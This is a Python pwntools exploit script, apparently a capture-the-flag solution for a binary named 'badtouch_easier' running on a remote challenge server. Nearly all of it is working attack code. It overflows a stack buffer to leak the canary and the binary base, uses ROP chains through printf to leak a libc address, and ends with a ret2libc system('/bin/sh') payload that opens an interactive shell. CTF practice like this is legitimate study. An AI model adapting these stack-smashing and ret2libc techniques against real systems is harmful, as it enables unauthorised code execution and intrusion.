#!/usr/bin/env python3
from enum import Enum
from pwn import *


# ----------------------=[Python Stuff]=---------------------- #

class Mode(Enum):
    DEBUG = 0
    LOCAL = 1
    REMOTE = 2


# ----------------------=[Packing Utils]=---------------------- #

p64 = lambda n: packing.pack(n, 64)
u64 = lambda n: packing.unpack(n, 64)
u32 = lambda n: packing.unpack(n, 32)
uu64 = lambda data: u64(data.ljust(8, b'\x00'))
uu32 = lambda data: u32(data.ljust(4, b'\x00'))

# ---------------------=[Common Settings]=--------------------- #

bin_path = './badtouch_easier'
# bin_path = './badtouch_easier_patched'
local_libc_path = './libc6_2.31-0ubuntu9.12_amd64.so'
remote_url = 'chal.firebird.sh'
remote_port = 35035

context.update(arch="amd64", os="linux")
context.log_level = 'debug'
context.binary = bin_path

gdb_break_points = [
    'touch+76'
]


# ------------------------=[Exploit]=-------------------------- #

def initialize_io(mode: Mode) -> process | remote:
    gdbscripts = "handle SIGALRM ignore\n"
    for bp in gdb_break_points:
        if bp:  # is not empty str
            gdbscripts += f"b* {bp}\n"

    # Initialize io based on mode
    match mode:
        case Mode.DEBUG:
            context.terminal = ["tmux", "splitw", "-h"]
            return gdb.debug([bin_path], gdbscripts)
        case Mode.LOCAL:
            return process([bin_path])
        case Mode.REMOTE:
            return remote(remote_url, remote_port)
        case _:
            exit(-1)


# -----------------------=[Main Pwn]=-------------------------- #

def do_pwn(io: process | remote) -> None:
    sla = io.sendlineafter
    sa = io.sendafter
    sl = io.sendline
    sd = io.send
    rl = io.recvline
    ru = io.recvuntil

    rop = ROP(bin_path)
    elf = ELF(bin_path)
    libc = ELF(local_libc_path)

    # rbp-0x20 = buf[24]
    # rbp-0x8 = canary
    # rbp = old rbp / return address
    # rbp+0x8 = old rbp / rip

    def badtouch(touch: bytes, recv=True) -> bytes:
        sla(b'touch me!\n', touch)
        if recv:
            recv_line = rl()
            if b"So here's your touch, huh?" in recv_line:
                # puts(buf);
                touch = rl(keepends=False)
                log.info(f"touch: {touch}")
                return touch
            else:
                return b'Success!'
        else:
            return b'Success!'

    def exploit() -> None:
        buffer_length = 24  # char buf[24]
        # read(0, buf, 96uLL);
        read_size = 96  # unsigned long long, 0x60uLL

        # We want to use the first round to leak the canary and the address of old RIP (main+158)
        # so we can calculate the address of main and the GOT table addresses
        def round1():
            # First we leak the canary
            log.info("Getting canary...")
            payload = flat(
                b'A' * buffer_length,
            )
            badtouch(payload, recv=False)

            rl()
            rl()
            # We get the canary
            _ = io.recv(7)
            # We accidentally overwrite the canary with lol, let's fix it
            canary = u64(b'\0' + _)
            log.info(f'{hex(canary)=}')

            # Secondly we leak the address of main+158 from rip (rbp+0x8), but since we overwrite
            # one byte with \0, we need to add remove the last 3 bits and then we get _init :D
            log.info("Getting leak of address...")
            payload = flat(
                b'A' * buffer_length,
                b'A' * 8,
                b'A' * 8,
            )
            badtouch(payload, recv=False)

            rl()
            rl()

            _ = io.recv(5)
            log.info(f'{_=}')
            # We accidentally overwrite the main address with shit lol, let's fix it
            mainaddress_leak = uu64(b'\0' + _)
            log.info(f'{hex(mainaddress_leak)=}')
            _init_addr = int(hex(mainaddress_leak)[2:][:-3] + '000', 16)
            log.info(f'{hex(_init_addr)=}')

            log.info(f'{hex(elf.sym["main"])=}')
            log.info(f'{hex(elf.sym["_init"])=}')

            elf.address = _init_addr - elf.sym["_init"]

            # And lastly to finish this round we put the address of main+148 to rip (rbp+0x8)
            # to get 3 more tries for next round
            log.info("Resetting for next round...")
            payload = flat(
                b'A' * buffer_length,
                p64(canary),
                b'A' * 8,
                p64(rop.ret.address + elf.address),
                p64(elf.sym["main"])
            )
            badtouch(payload, recv=False)

            return canary

        def leak_addr(lib_c_func):
            log.info("Doing 2x nothing for fun :D ...")
            badtouch(b'')
            badtouch(b'')

            log.info(f"Getting {lib_c_func} address...")
            payload = flat(
                b'A' * buffer_length,
                p64(canary),
                b'A' * 8,
                p64(rop.rdi.address + elf.address),
                p64(elf.got[lib_c_func]),
                p64(rop.ret.address + elf.address),
                p64(elf.plt["printf"]),
                p64(rop.ret.address + elf.address),
                p64(elf.sym['main'])  # maybe not use p64 here?
            )
            badtouch(payload)

            addr_leak = ru(b'\x7f')
            log.info(f'{addr_leak=}')
            addr = uu64(addr_leak)
            log.info(f'{hex(addr)=}')

            return addr

        # We want to use the second round to leak the puts address and calculate the libc address
        def round2():
            # First we leak the puts address to get libc address
            printf_addr = leak_addr('printf')
            # puts_addr = leak_addr('puts')
            # read_addr = leak_addr('read')
            log.info(f'{hex(printf_addr)=}')
            # log.info(f'{hex(puts_addr)=}')
            # log.info(f'{hex(read_addr)=}')

            # Now we can calculate the libc address
            if hex(printf_addr - libc.sym['printf'])[-3:] != '000':
                log.error("Possible libc address is not aligned to 0x000!")
                exit(1)
            libc.address = printf_addr - libc.sym['printf']
            log.info(f'{hex(libc.address)=}')

        # We want to use the third round to get shell, hopefully
        def round3():
            log.info("Doing 2x nothing for fun :D ... again!")
            badtouch(b'')
            badtouch(b'')

            # Now we can get shell
            log.info("Getting shell...")
            payload = flat(
                b'A' * buffer_length,
                p64(canary),
                b'A' * 8,
                p64(rop.rdi.address + elf.address),
                p64(next(libc.search(b'/bin/sh\x00'))),
                p64(rop.ret.address + elf.address),
                p64(libc.sym['system'])
            )
            badtouch(payload, recv=False)

        log.info("Round 1!")
        canary = round1()

        log.info("Round 2! Ready?")
        # pause()
        round2()

        log.info("Round 3! Ready?")
        # pause()
        round3()

    exploit()
    # pause()


# --------------------=[End of Exploit]=----------------------- #

def main() -> None:
    io = initialize_io(Mode.REMOTE)
    do_pwn(io)
    io.interactive()


if __name__ == '__main__':
    main()

# ----------------------------=[EOF]=--------------------------- #
